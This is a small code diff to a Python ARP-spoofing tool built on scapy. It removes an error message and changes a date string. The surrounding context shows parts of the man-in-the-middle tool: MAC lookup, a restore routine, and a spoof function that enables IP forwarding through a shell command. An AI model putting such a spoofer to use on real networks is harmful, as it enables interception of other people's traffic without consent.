@@ -24,7 +24,6 @@ def get_mac(ip):
         sendpacket = scapy.srp(create_packet, timeout=1, verbose=False)[0]
         return sendpacket[0][1].hwsrc
     except IndexError:
-        print("error occured")
         pass
 
 
@@ -43,7 +42,7 @@ def restore(target_ip, spoof_ip):
 
 def spoof(target_ip, spoof_ip, count, sleeptime):
     print("\nARP-spoofer coded by @koushikk11\n")
-    print("Date:26/06/2021\n")
+    print("Date:23/06/2021\n")
     subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
     print("[+]ip forwarding enabled")
     print("[+]( machine1 )-<->-( YOU )-<->-( machine2 )")
